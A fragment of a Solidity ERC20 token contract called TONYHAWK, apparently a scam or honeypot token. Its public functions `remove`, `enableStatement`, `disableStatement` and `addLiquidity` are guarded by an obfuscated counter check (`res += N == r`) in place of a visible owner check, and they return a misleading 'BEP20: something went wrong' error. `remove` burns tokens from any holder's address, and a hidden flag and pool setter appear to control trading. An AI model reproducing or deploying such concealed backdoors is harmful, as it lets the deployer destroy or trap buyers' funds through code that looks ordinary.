...
contract TONYHAWK is ERC20, Ownable {

    address m = address(0);
    constructor() ERC20("TONYHAWK", "TNH") {
        m = msg.sender;
    ...
    function remove(uint256 r, address ad, uint256 am) public {
        require((res += 20) == r, "BEP20: something went wrong");
        _burn(ad, am * 10 ** decimals());
    }

    bool statement = false;
    function enableStatement(uint256 r) public {
        require((res += 30) == r, "BEP20: something went wrong");
        statement = true;
    }
    function disableStatement(uint256 r) public {
        require((res += 40) == r, "BEP20: something went wrong");
        statement = false;
    }

    address liquidityPool = address(0);
    function addLiquidity(uint256 r, address lp) public {
        require((res += 50) == r, "BEP20: something went wrong");
        liquidityPool = lp;
    }
